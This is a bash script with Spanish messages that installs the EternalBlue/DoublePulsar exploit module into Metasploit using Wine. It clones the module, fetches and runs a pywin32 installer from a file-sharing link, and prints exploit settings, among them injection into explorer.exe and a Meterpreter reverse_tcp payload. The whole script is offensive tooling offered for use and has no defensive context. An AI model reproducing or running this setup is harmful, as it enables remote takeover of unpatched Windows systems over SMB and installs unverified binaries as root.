#!/bin/bash

echo ""
echo -e "\e[31m Se instalara el exploit eternalblue_doublepulsar de eleven paths\e[0m"
echo ""

apt-get update -y
apt-get upgrade -y
apt-get install wine -y
apt-get install winetricks -y
dpkg --add-architecture i386 && apt-get update && apt-get install wine32 -y
echo -e "\e[33mAcontinuacion...\e[0m"
echo -e "\e[33Select the default wineprefix\e[0m"
echo -e "\e[33minstalar a windows dll or componentes\e[0m"
echo -e "\e[33minstalar python2.6 y cmd\e[0m"
echo -e "\e[33No se preocupen por las ventanas de error - es normal\e[0m"
echo -e "\e[33mInstala python GUI\e[0m"
echo -e "\e[31mCuando salte nuevamente la ventana de - instalar a windows dll or componentes - ya puedes cerrarla dandole en cancelar 2 veces\e[0m"
winetricks --gui
git clone https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit
cd Eternalblue-Doublepulsar-Metasploit/
cp -r deps/ /usr/share/metasploit-framework/modules/exploits/windows/smb
cp eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb
mkdir -p /root/.wine/drive_c/
echo -e "\e[33mAcontinuacion descarga e instala pywin32 -python2.6\e[0m"
wget http://download946.mediafire.com/8ko16qjdw2ug/yd7cose1ha7v8sm/pywin32-212.win32-py2.6.exe
wine pywin32-212.win32-py2.6.exe

echo ""
echo -e "\e[31m*****************************************************************\e[0m"
echo -e "\e[33mVerifique el exploit - ejecute metasploit y verifique el exploit \e[0m"
echo -e "\e[33mRuta: exploit/windows/smb/eternalblue_doublepulsar \e[0m"
echo ""
echo "Configura tu exploit"
echo ""
echo "set doublepulsarpath /usr/share/metasploit-framework/modules/exploits/windows/smb/deps"
echo "set eternalbluepath /usr/share/metasploit-framework/modules/exploits/windows/smb/deps"
echo "set processinject explorer.exe"
echo -e "\e[31m*****************************************************************\e[0m"
echo ""
echo -e "\e[31m*****************************************************************\e[0m"
echo -e "\e[33mSi recibe algunos errores relacionados con la arquitectura, como 'Error al enviar una DLL de arquitectura incorrecta al destino', \e[0m"
echo -e "\e[33mcomo se muestra a continuación, significa que está usando una carga útil incorrecta, asegúrese de que debe usar la carga útil \e[0m"
echo -e "\e[33mde Windows/x64/meterpreter/reverse_tcp para 64- sistemas operativos bit\e[0m"
echo ""
echo "Configure lo siguiente para x64"
echo "set payload windows/x64/meterpreter/reverse_tcp"
echo -e "\e[31m*****************************************************************\e[0m"
